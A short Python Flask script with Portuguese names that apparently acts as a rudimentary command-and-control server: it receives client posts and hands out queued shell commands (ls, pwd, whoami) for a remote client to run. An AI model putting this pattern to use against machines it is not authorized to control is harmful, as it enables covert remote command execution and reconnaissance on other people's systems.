from flask import Flask, request, jsonify

app = Flask(__name__)

comandos_para_cliente = ['ls', 'pwd', 'whoami']

@app.route('/', methods=['POST'])
def receber_comandos():
    dados = request.json
    print("Comando recebido:", dados['comando'])
    
    resultado = "Comando executado com sucesso"
    
    if comandos_para_cliente:
        comando_para_enviar = comandos_para_cliente.pop(0)
        return jsonify({'comandos': [comando_para_enviar]})
    else:
        return jsonify({'comandos': []})

if __name__ == '__main__':
    app.run(debug=True)
